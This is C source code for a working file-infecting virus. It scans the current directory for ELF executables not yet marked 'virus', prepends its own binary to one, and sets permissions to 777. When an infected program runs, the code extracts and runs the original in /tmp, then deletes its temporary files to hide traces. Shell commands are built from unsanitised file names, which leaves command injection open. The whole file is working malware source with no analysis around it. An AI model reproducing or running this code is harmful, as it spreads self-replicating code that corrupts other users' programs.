#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int is_file_infected (char filename[])
{
	char output[400];
	char command [400];
	snprintf(command, sizeof command, "%s%s%s", "strings ", filename, "| grep virus > /tmp/virussearch046.txt");
	char inf[] = "virus";
	FILE *finf;
	system(&command[0]);	
	finf = fopen("/tmp/virussearch046.txt", "r");
   	fgets(output,399,finf);
    return (strstr(output,inf) != NULL);
}

int is_file_elf(char filename[])
{
    char command[200];
	snprintf(command, sizeof command, "%s%s%s", "file ", filename, " > /tmp/elfsearch046.txt");
    char elf[] = "ELF";
    char output[200];
    FILE *file;
	system(&command[0]);
    file = fopen("/tmp/elfsearch046.txt", "r");
    fgets(output,199,file);
    return (strstr(output,elf) != NULL);
}

int main(int argc, char* argv[])
{
    FILE *fp;
	FILE *virus_file,*target_file,*current_file;
	char command[500];
	char filename[100];
   
	system("ls > /tmp/contents046.txt");
    fp = fopen("/tmp/contents046.txt", "r");
    while (!feof(fp))
    {
		fgets(filename,300,fp);
		filename[strlen(filename)-1]='\0';
        if(is_file_elf(filename))
		{
		   if (is_file_infected(filename) == 0)
			{
				snprintf(command, sizeof command, "%s%s%s%s%s%s", "cat virus ", filename, " > /tmp/infect046.tmp;mv /tmp/infect046.tmp ", filename, ";chmod 777 ", filename);
				system(&command[0]);
				break;
			}
			
		}
	}
	if(strcmp(argv[0],"virus") == 0 || strcmp(argv[0] , "./virus") == 0)
	{
		char delete_command[] = "find /tmp -name '*046*' -delete";
		system(&delete_command[0]);
		exit(0);		
	}
	else
	{
		char ch;int i;
		virus_file = fopen("virus", "r");
		fseek(virus_file,0,SEEK_END);
		int end = ftell(virus_file);
		fclose(virus_file);
	   	current_file = fopen(argv[0],"r");
		target_file = fopen("/tmp/target046","w");
		fseek(current_file, end, SEEK_SET);
		while (!feof(current_file))
		{
			ch = fgetc(current_file);
			fputc(ch, target_file);
		}
		fclose(current_file);
		fclose(target_file);
		system("chmod 777 /tmp/target046");
		if(argc==1)	
		{
			system("/tmp/target046");
		}
		else
		{
			char original_functionality[200] = "/tmp/target046 ";
			for (i=2; i<=argc; i++)
			{	
				if(i == argc)
					strcat(original_functionality, argv[i-1]);
				else
					{
						strcat(original_functionality, argv[i-1]);
						strcat(original_functionality, " ");
					}
			}
			system(&original_functionality[0]);			
		}	
	}
	printf("Hello! I am a simple virus!\n");
	char delete_command[] = "find /tmp -name '*046*' -delete";
	system(&delete_command[0]);
    return 0;
}

